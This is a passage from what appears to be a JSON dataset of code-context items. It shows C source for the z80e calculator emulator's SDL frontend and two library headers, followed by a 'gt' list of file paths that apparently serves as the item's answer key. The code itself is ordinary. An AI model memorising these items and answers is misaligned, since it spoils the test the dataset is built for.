ti_bw_lcd_t *lcd) {\n\tint cY;\n\tint cX;\n\n\tif (context.braille) {\n\t\tfor (cX = 0; cX < 64; cX += 4) {\n\t\t\tfor (cY = 0; cY < 120; cY += 2) {\n\t\t\t\tint a = _bw_lcd_read_screen(lcd, cY + 0, cX + 0);\n\t\t\t\tint b = _bw_lcd_read_screen(lcd, cY + 0, cX + 1);\n\t\t\t\tint c = _bw_lcd_read_screen(lcd, cY + 0, cX + 2);\n\t\t\t\tint d = _bw_lcd_read_screen(lcd, cY + 1, cX + 0);\n\t\t\t\tint e = _bw_lcd_read_screen(lcd, cY + 1, cX + 1);\n\t\t\t\tint f = _bw_lcd_read_screen(lcd, cY + 1, cX + 2);\n\t\t\t\tint g = _bw_lcd_read_screen(lcd, cY + 0, cX + 3);\n\t\t\t\tint h = _bw_lcd_read_screen(lcd, cY + 1, cX + 3);\n\t\t\t\tuint32_t byte_value = 0x2800;\n\t\t\t\tbyte_value += (\n\t\t\t\t\t\t(a << 0) |\n\t\t\t\t\t\t(b << 1) |\n\t\t\t\t\t\t(c << 2) |\n\t\t\t\t\t\t(d << 3) |\n\t\t\t\t\t\t(e << 4) |\n\t\t\t\t\t\t(f << 5) |\n\t\t\t\t\t\t(g << 6) |\n\t\t\t\t\t\t(h << 7));\n\t\t\t\tchar buff[5] = {0};\n\t\t\t\ttui_unicode_to_utf8(buff, byte_value);\n\t\t\t\tprintf(\"%s\", buff);\n\t\t\t}\n\t\t\tprintf(\"\\n\");\n\t\t}\n\t}\n\n\n\n\tSDL_SetRenderDrawColor(context.renderer, COLOR_CLEAR);\n        SDL_RenderClear(context.renderer);\n\tfor (cX = 0; cX < 64; cX++) {\n\t\tfor (cY = 0; cY < 96; cY++) {\n\t\t\tint cXZ = (cX + lcd->Z) % 64;\n\t\t\tif (_bw_lcd_read_screen(lcd, cY, cXZ)) {\n\t\t\t\tSDL_SetRenderDrawColor(context.renderer, COLOR_ON);\n\t\t\t} else {\n\t\t\t\tSDL_SetRenderDrawColor(context.renderer, COLOR_OFF);\n\t\t\t}\n\t\t\tSDL_RenderDrawPoint(context.renderer, cY, cX);\n\t\t}\n\t}\n\tSDL_RenderPresent(context.renderer);\n\n\n\n\tif (context.log_level >= L_INFO) {\n\t\tprintf(\"C: 0x%02X X: 0x%02X Y: 0x%02X Z: 0x%02X\\n\", lcd->contrast, lcd->X, lcd->Y, lcd->Z);\n\t\tprintf(\"   %c%c%c%c  O1: 0x%01X 02: 0x%01X\\n\", lcd->up ? 'V' : '^', lcd->counter ? '-' : '|',\n\t\t\t\tlcd->word_length ? '8' : '6', lcd->display_on ? 'O' : ' ', lcd->op_amp1, lcd->op_amp2);\n\t}\n}\n\nvoid lcd_timer_tick(asic_t *asic, void *data) {\n\tti_bw_lcd_t *lcd = data;\n\tif (lcd_changed) {\n\t\tprint_lcd(asic, lcd);\n\t\tlcd_changed = 0;\n\t}\n}\n\nvoid setDevice(appContext_t *context, char *target) {\n\tif (strcasecmp(target, \"TI73\") == 0) {\n\t\tcontext->device = TI73;\n\t} else if (strcasecmp(target, \"TI83p\") == 0) {\n\t\tcontext->device = TI83p;\n\t} else if (strcasecmp(target, \"TI83pSE\") == 0) {\n\t\tcontext->device = TI83pSE;\n\t} else if (strcasecmp(target, \"TI84p\") == 0) {\n\t\tcontext->device = TI84p;\n\t} else if (strcasecmp(target, \"TI84pSE\") == 0) {\n\t\tcontext->device = TI84pSE;\n\t} else if (strcasecmp(target, \"TI84pCSE\") == 0) {\n\t\tcontext->device = TI84pCSE;\n\t} else {\n\t\tprintf(\"Incorrect usage. See z80e --help.\\n\");\n\t\texit(1);\n\t}\n}\n\nvoid print_help(void) {\n\tprintf(\"z80e - Emulate z80 calculators\\n\"\n\t\t\t\"Usage: z80e [flags] [rom]\\n\\n\"\n\t\t\t\"Flags:\\n\"\n\t\t\t\"\\t-d <device>: Selects a device to emulate. Available devices:\\n\"\n\t\t\t\"\\t\\tTI73, TI83p, TI83pSE, TI84p, TI84pSE, TI84pCSE\\n\"\n\t\t\t\"\\t-c <cycles>: Emulate this number of cycles, then exit. If omitted, the machine will be emulated indefinitely.\\n\"\n\t\t\t\"\\t-s <scale>: Scale window by <scale> times.\\n\"\n\t\t\t\"\\t--braille: Enables braille display in console.\\n\"\n\t\t\t\"\\t--print-state: Prints the state of the machine on exit.\\n\"\n\t\t\t\"\\t--no-rom-check: Skips the check that ensure the provided ROM file is the correct size.\\n\"\n\t\t\t\"\\t--debug: Enable the debugger, which is enabled by interrupting the emulator.\\n\");\n}\n\nvoid handleFlag(appContext_t *context, char flag, int *i, char **argv) {\n\tchar *next;\n\tswitch (flag) {\n\t\tcase 'd':\n\t\t\tnext = argv[++*i];\n\t\t\tsetDevice(context, next);\n\t\t\tbreak;\n\t\tcase 'c':\n\t\t\tnext = argv[++*i];\n\t\t\tcontext->cycles = atoi(next);\n\t\t\tbreak;\n\t\tcase 's':\n\t\t\tnext = argv[++*i];\n\t\t\tcontext->scale = atoi(next);\n\t\t\tbreak;\n\t\tcase 'o':\n\t\t\tnext = argv[++*i];\n\t\t\tdisassembler_load_object(next);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tprintf(\"Incorrect usage. See z80e --help.\\n\");\n\t\t\texit(1);\n\t\t\tbreak;\n\t}\n}\n\nint enable_debug = 0;\n\nvoid handleLongFlag(appContext_t *context, char *flag, int *i, char **argv) {\n\tif (strcasecmp(flag, \"device\") == 0) {\n\t\tchar *next = argv[++*i];\n\t\tsetDevice(context, next);\n\t} else if (strcasecmp(flag, \"print-state\") == 0) {\n\t\tcontext->print_state = 1;\n\t} else if (strcasecmp(flag, \"no-rom-check\") == 0) {\n\t\tcontext->no_rom_check = 1;\n\t} else if (strcasecmp(flag, \"braille\") == 0) {\n\t\tcontext->braille = 1;\n\t} else if (strcasecmp(flag, \"log\") == 0) {\n\t\tchar *level = argv[++*i];\n\t\tint j;\n\t\tfor (j = 0; j < sizeof(log_options) / sizeof(loglevel_options_t); ++j) {\n\t\t\tif (strcasecmp(level, log_options[j].key) == 0) {\n\t\t\t\tcontext->log_level = log_options[j].level;\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\tfprintf(stderr, \"%s is not a valid logging level.\\n\", level);\n\t\texit(1);\n\t} else if (strcasecmp(flag, \"debug\") == 0) {\n\t\tenable_debug = 1;\n\t} else if (strcasecmp(flag, \"help\") == 0) {\n\t\tprint_help();\n\t\texit(0);\n\t} else {\n\t\tprintf(\"Incorrect usage. See z80e --help.\\n\");\n\t\texit(1);\n\t}\n}\n\nvoid frontend_log(void *data, loglevel_t level, const char *part, const char *message, va_list args) {\n\tvprintf(message, args);\n\tprintf(\"\\n\");\n}\n\nvoid sigint_handler(int sig) {\n\tsignal(SIGINT, sigint_handler);\n\n\tlog_message(context.device_asic->log, L_ERROR, \"sigint\", \"Caught interrupt, stopping emulation\");\n\tcontext.device_asic->stopped = 1;\n\n\tif (!context.device_asic->debugger || context.device_asic->debugger->state == DEBUGGER_ENABLED) {\n#ifdef CURSES\n\t\tendwin();\n#endif\n\t\texit(0);\n\t}\n\n\tfflush(stdout);\n}\n\nvoid key_tap(asic_t *asic, int scancode, int down) {\n\tif (down) {\n\t\tdepress_key(asic->cpu->devices[0x01].device, scancode);\n\t} else {\n\t\trelease_key(asic->cpu->devices[0x01].device, scancode);\n\t}\n}\n\nvoid sdl_events_hook(asic_t *device, void * unused) {\n\tSDL_Event event;\n\twhile (SDL_PollEvent(&event)) {\n\t\tswitch (event.type) {\n\t\t\tcase SDL_KEYDOWN:\n\t\t\tcase SDL_KEYUP:\n\t\t\t\tswitch (event.key.keysym.sym) {\n\t\t\t\t\tcase SDLK_LSHIFT:\n\t\t\t\t\t\tkey_tap(device, 0x65, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_RSHIFT:\n\t\t\t\t\t\tkey_tap(device, 0x16, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_BACKSPACE:\n\t\t\t\t\t\tkey_tap(device, 0x16, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_LCTRL:\n\t\t\t\t\tcase SDLK_RCTRL:\n\t\t\t\t\t\tkey_tap(device, 0x57, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_ESCAPE:\n\t\t\t\t\t\tkey_tap(device, 0x66, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F1:\n\t\t\t\t\t\tkey_tap(device, 0x64, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F2:\n\t\t\t\t\t\tkey_tap(device, 0x63, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F3:\n\t\t\t\t\t\tkey_tap(device, 0x62, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F4:\n\t\t\t\t\t\tkey_tap(device, 0x61, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F5:\n\t\t\t\t\t\tkey_tap(device, 0x60, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F7:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F8:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F10:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F11:\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_F12:\n\t\t\t\t\t\tif (event.type == SDL_KEYDOWN) {\n\t\t\t\t\t\t\tdepress_on_key(device->interrupts);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\trelease_on_key(device->interrupts);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_SPACE:\n\t\t\t\t\t\tkey_tap(device, 0x40, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_INSERT:\n\t\t\t\t\t\tkey_tap(device, 0x26, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_HOME:\n\t\t\t\t\t\tkey_tap(device, 0x56, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_PAGEUP:\n\t\t\t\t\t\tkey_tap(device, 0x46, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_PAGEDOWN:\n\t\t\t\t\t\tkey_tap(device, 0x36, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_END:\n\t\t\t\t\t\tkey_tap(device, 0x37, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n                                        case SDLK_PLUS:\n\t\t\t\t\tcase SDLK_EQUALS:\n\t\t\t\t\t\tkey_tap(device, 0x47, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n                                        case SDLK_UNDERSCORE:\n\t\t\t\t\tcase SDLK_MINUS:\n\t\t\t\t\t\tkey_tap(device, 0x20, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n                                        case SDLK_QUESTION:\n\t\t\t\t\tcase SDLK_SLASH:\n\t\t\t\t\t\tkey_tap(device, 0x37, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_2:\n\t\t\t\t\t\tkey_tap(device, 0x00, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_3:\n\t\t\t\t\t\tkey_tap(device, 0x36, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_4:\n\t\t\t\t\t\tkey_tap(device, 0x02, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_6:\n\t\t\t\t\t\tkey_tap(device, 0x01, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_7:\n\t\t\t\t\t\tkey_tap(device, 0x56, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_8:\n\t\t\t\t\t\tkey_tap(device, 0x03, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_9:\n\t\t\t\t\t\tkey_tap(device, 0x46, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_0:\n\t\t\t\t\t\tkey_tap(device, 0x26, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_PLUS:\n\t\t\t\t\t\tkey_tap(device, 0x11, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_MINUS:\n\t\t\t\t\t\tkey_tap(device, 0x12, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_MULTIPLY:\n\t\t\t\t\t\tkey_tap(device, 0x13, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_KP_DIVIDE:\n\t\t\t\t\t\tkey_tap(device, 0x14, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_a:\n\t\t\t\t\t\tkey_tap(device, 0x56, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_b:\n\t\t\t\t\t\tkey_tap(device, 0x46, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_c:\n\t\t\t\t\t\tkey_tap(device, 0x36, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_d:\n\t\t\t\t\t\tkey_tap(device, 0x55, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_e:\n\t\t\t\t\t\tkey_tap(device, 0x45, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_f:\n\t\t\t\t\t\tkey_tap(device, 0x35, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_g:\n\t\t\t\t\t\tkey_tap(device, 0x25, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_h:\n\t\t\t\t\t\tkey_tap(device, 0x15, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_i:\n\t\t\t\t\t\tkey_tap(device, 0x54, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_j:\n\t\t\t\t\t\tkey_tap(device, 0x44, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_k:\n\t\t\t\t\t\tkey_tap(device, 0x34, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_l:\n\t\t\t\t\t\tkey_tap(device, 0x24, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_m:\n\t\t\t\t\t\tkey_tap(device, 0x14, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_n:\n\t\t\t\t\t\tkey_tap(device, 0x53, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_o:\n\t\t\t\t\t\tkey_tap(device, 0x43, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_p:\n\t\t\t\t\t\tkey_tap(device, 0x33, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_q:\n\t\t\t\t\t\tkey_tap(device, 0x23, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_r:\n\t\t\t\t\t\tkey_tap(device, 0x13, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_s:\n\t\t\t\t\t\tkey_tap(device, 0x52, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_t:\n\t\t\t\t\t\tkey_tap(device, 0x42, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_u:\n\t\t\t\t\t\tkey_tap(device, 0x32, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_v:\n\t\t\t\t\t\tkey_tap(device, 0x22, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_w:\n\t\t\t\t\t\tkey_tap(device, 0x12, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_x:\n\t\t\t\t\t\tkey_tap(device, 0x51, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_y:\n\t\t\t\t\t\tkey_tap(device, 0x41, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_z:\n\t\t\t\t\t\tkey_tap(device, 0x31, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_0:\n\t\t\t\t\t\tkey_tap(device, 0x40, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_1:\n\t\t\t\t\t\tkey_tap(device, 0x41, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_2:\n\t\t\t\t\t\tkey_tap(device, 0x31, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_3:\n\t\t\t\t\t\tkey_tap(device, 0x21, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_4:\n\t\t\t\t\t\tkey_tap(device, 0x42, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_5:\n\t\t\t\t\t\tkey_tap(device, 0x32, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_6:\n\t\t\t\t\t\tkey_tap(device, 0x22, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_7:\n\t\t\t\t\t\tkey_tap(device, 0x43, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_8:\n\t\t\t\t\t\tkey_tap(device, 0x33, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_9:\n\t\t\t\t\t\tkey_tap(device, 0x23, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_UP:\n\t\t\t\t\t\tkey_tap(device, 0x03, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_LEFT:\n\t\t\t\t\t\tkey_tap(device, 0x01, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_RIGHT:\n\t\t\t\t\t\tkey_tap(device, 0x02, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_DOWN:\n\t\t\t\t\t\tkey_tap(device, 0x00, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_RETURN:\n\t\t\t\t\t\tkey_tap(device, 0x10, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_DELETE:\n\t\t\t\t\t\tkey_tap(device, 0x67, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase SDLK_PERIOD:\n\t\t\t\t\tcase SDLK_SEMICOLON:\n\t\t\t\t\t\tkey_tap(device, 0x30, event.type == SDL_KEYDOWN);\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tbreak;\n\t\t\tcase SDL_WINDOWEVENT:\n\t\t\t\tlcd_changed = 1;\n\t\t\t\tbreak;\n\t\t\tcase SDL_QUIT:\n\t\t\t\texit(0);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t}\n}\n\nint main(int argc, char **argv) {\n\tcontext = create_context();\n\tsignal(SIGINT, sigint_handler);\n\n\tdisassembler_init();\n\n\tint i;\n\tfor (i = 1; i < argc; i++) {\n\t\tchar *a = argv[i];\n\t\tif (*a == '-') {\n\t\t\ta++;\n\t\t\tif (*a == '-') {\n\t\t\t\thandleLongFlag(&context, a + 1, &i, argv);\n\t\t\t} else {\n\t\t\t\twhile (*a) {\n\t\t\t\t\thandleFlag(&context, *a++, &i, argv);\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\tif (context.rom_file == NULL) {\n\t\t\t\tcontext.rom_file = a;\n\t\t\t} else {\n\t\t\t\tprintf(\"Incorrect usage. See z80e --help.\\n\");\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\n\tlog_t *log = init_log_z80e(frontend_log, 0, context.log_level);\n\tasic_t *device = asic_init(context.device, log);\n\tcontext.device_asic = device;\n\n\tif (enable_debug) {\n\t\tdevice->debugger = init_debugger(device);\n\t\tdevice->debugger->state = DEBUGGER_ENABLED;\n\t}\n\n\tif (context.rom_file == NULL && !enable_debug) {\n\t\tlog_message(device->log, L_WARN, \"main\", \"No ROM file specified, starting debugger\");\n\t\tdevice->debugger = init_debugger(device);\n\t\tdevice->debugger->state = DEBUGGER_ENABLED;\n\t} else {\n\t\tFILE *file = fopen(context.rom_file, \"r\");\n\t\tif (!file) {\n\t\t\tprintf(\"Error opening '%s'.\\n\", context.rom_file);\n\t\t\tasic_free(device);\n\t\t\treturn 1;\n\t\t}\n\t\tint length;\n\t\tfseek(file, 0L, SEEK_END);\n\t\tlength = ftell(file);\n\t\tfseek(file, 0L, SEEK_SET);\n\t\tif (!context.no_rom_check && length != device->mmu->settings.flash_pages * 0x4000) {\n\t\t\tprintf(\"Error: This file does not match the required ROM size of %d bytes, but it is %d bytes (use --no-rom-check to override).\\n\",\n\t\t\t\t\tdevice->mmu->settings.flash_pages * 0x4000, length);\n\t\t\tfclose(file);\n\t\t\tasic_free(device);\n\t\t\treturn 1;\n\t\t}\n\t\tlength = fread(device->mmu->flash, 0x4000, device->mmu->settings.flash_pages, file);\n\t\tfclose(file);\n\t}\n\n\tSDL_Init(SDL_INIT_EVERYTHING);\n\tSDL_CreateWindowAndRenderer(context.scale * 96, context.scale * 64, SDL_WINDOW_RESIZABLE,\n\t\t\t&context.window, &context.renderer);\n\tSDL_SetWindowTitle(context.window, \"z80e\");\n\tSDL_RenderSetLogicalSize(context.renderer, 96, 64);\n\n\thook_add_lcd_update(device->hook, NULL, lcd_changed_hook);\n\tasic_add_timer(device, 0, 60, lcd_timer_tick, device->cpu->devices[0x10].device);\n\tasic_add_timer(device, 0, 100, sdl_events_hook, device->cpu->devices[0x10].device);\n\n\tif (device->debugger) {\n\t\ttui_state_t state = { device->debugger };\n\t\ttui_init(&state);\n\t\ttui_tick(&state);\n\t} else {\n\t\tif (context.cycles == -1) {\n\t\t\twhile (1) {\n\t\t\t\trunloop_tick(device->runloop);\n\t\t\t\tif (device->stopped) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tnanosleep((struct timespec[]){{0, (1.f / 60.f) * 1000000000}}, NULL);\n\t\t\t}\n\t\t} else {\n\t\t\trunloop_tick_cycles(device->runloop, context.cycles);\n\t\t}\n\t}\n\nfinish:\n\n\tif (context.print_state) {\n\t\tprint_state(&device->cpu->registers);\n\t}\n\tasic_free(device);\n\treturn 0;\n}\n\n'z80e/libz80e/include/z80e/core/cpu.h'\n:#ifndef CPU_H\n#define CPU_H\n\n#include <stdint.h>\n\n#include <z80e/core/registers.h>\n#include <z80e/log/log.h>\n\ntypedef struct z80cpu z80cpu_t;\ntypedef struct z80iodevice z80iodevice_t;\n\n#include <z80e/debugger/hooks.h>\n\nstruct z80iodevice {\n\tvoid *device;\n\tuint8_t (*read_in)(void *);\n\tvoid (*write_out)(void *, uint8_t);\n};\n\nstruct z80cpu {\n\tz80iodevice_t devices[0x100];\n\tz80registers_t registers;\n\tstruct {\n\t\tuint8_t IFF1 : 1;\n\t\tuint8_t IFF2 : 1;\n\t\tuint8_t int_mode : 2;\n\n\t\tuint8_t IFF_wait : 1;\n\t\tuint8_t halted : 1;\n\t};\n\tuint8_t bus;\n\tuint16_t prefix;\n\tvoid *memory;\n\tuint8_t (*read_byte)(void *, uint16_t);\n\tvoid (*write_byte)(void *, uint16_t, uint8_t);\n\tint interrupt;\n\thook_info_t *hook;\n\tlog_t *log;\n};\n\n\nuint8_t cpu_read_register_byte(z80cpu_t *, registers);\nuint16_t cpu_read_register_word(z80cpu_t *, registers);\n\nuint8_t cpu_write_register_byte(z80cpu_t *, registers, uint8_t);\nuint16_t cpu_write_register_word(z80cpu_t *, registers, uint16_t);\n\nz80cpu_t* cpu_init(log_t *log);\nvoid cpu_free(z80cpu_t *cpu);\nuint8_t cpu_read_byte(z80cpu_t *cpu, uint16_t address);\nvoid cpu_write_byte(z80cpu_t *cpu, uint16_t address, uint8_t value);\nuint16_t cpu_read_word(z80cpu_t *cpu, uint16_t address);\nvoid cpu_write_word(z80cpu_t *cpu, uint16_t address, uint16_t value);\nint cpu_execute(z80cpu_t *cpu, int cycles);\n\n#endif\n\n'z80e/libz80e/include/z80e/ti/asic.h'\n:#ifndef ASIC_H\n#define ASIC_H\n\n#include <stdint.h>\n#ifndef NOLINK\n#include <poll.h>\n#endif\n\ntypedef struct asic asic_t;\n\n#include <z80e/core/cpu.h>\n#include <z80e/log/log.h>\n#include <z80e/ti/memory.h>\n#include <z80e/ti/ti.h>\n#include <z80e/runloop/runloop.h>\n#include <z80e/debugger/hooks.h>\n#include <z80e/debugger/debugger.h>\n#include <z80e/ti/hardware/interrupts.h>\n\ntypedef enum {\n\tBATTERIES_REMOVED,\n\tBATTERIES_LOW,\n\tBATTERIES_GOOD\n} battery_state;\n\n\ntypedef void (*timer_tick)(asic_t *, void *);\ntypedef struct z80_hardware_timers z80_hardware_timers_t;\ntypedef struct z80_hardware_timer z80_hardware_timer_t;\ntypedef struct z80_link_socket z80_link_socket_t;\n\nenum {\n\tTIMER_IN_USE = (1 << 0),\n\tTIMER_ONE_SHOT = (1 << 1)\n};\n\nstruct z80_hardware_timer {\n\tint cycles_until_tick;\n\n\tint flags;\n\tdouble frequency;\n\ttimer_tick on_tick;\n\tvoid *data;\n};\n\nstruct z80_hardware_timers {\n\tint max_timers;\n\tz80_hardware_timer_t *timers;\n};\n\nstruct z80_link_socket {\n#ifndef NOLINK\n\tint accept;\n\tstruct pollfd listenfd;\n\tstruct pollfd clients[10];\n#endif\n};\n\nstruct asic {\n\tint stopped;\n\tti_device_type device;\n\tbattery_state battery;\n\tint battery_remove_check;\n\tint clock_rate;\n\n\tz80cpu_t* cpu;\n\trunloop_state_t *runloop;\n\tti_mmu_t* mmu;\n\tti_interrupts_t *interrupts;\n\tz80_hardware_timers_t *timers;\n\tz80_link_socket_t *link;\n\thook_info_t *hook;\n\tlog_t *log;\n\tdebugger_t *debugger;\n};\n\nasic_t* asic_init(ti_device_type, log_t *);\nvoid asic_free(asic_t*);\n\nint asic_set_clock_rate(asic_t *, int);\n\nint asic_add_timer(asic_t *, int, double, timer_tick, void *);\nvoid asic_remove_timer(asic_t *, int);\n\n#endif\n",
        "gt": [
            "'z80e/libz80e/include/z80e/core/cpu.h'",
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/ti/hardware/interrupts.h'",
            "'z80e/frontends/sdl/main.c'"
        ]
    },
    {
        "files": [
            "'recordmydesktop/recordmydesktop/src/rmd_macro.h'",
            "'recordmydesktop/recordmydesktop/src/rmd_yuv_utils.h'",
            "'recordmydesktop/recordmydesktop/src/rmd_initialize_data.c'"
        ],
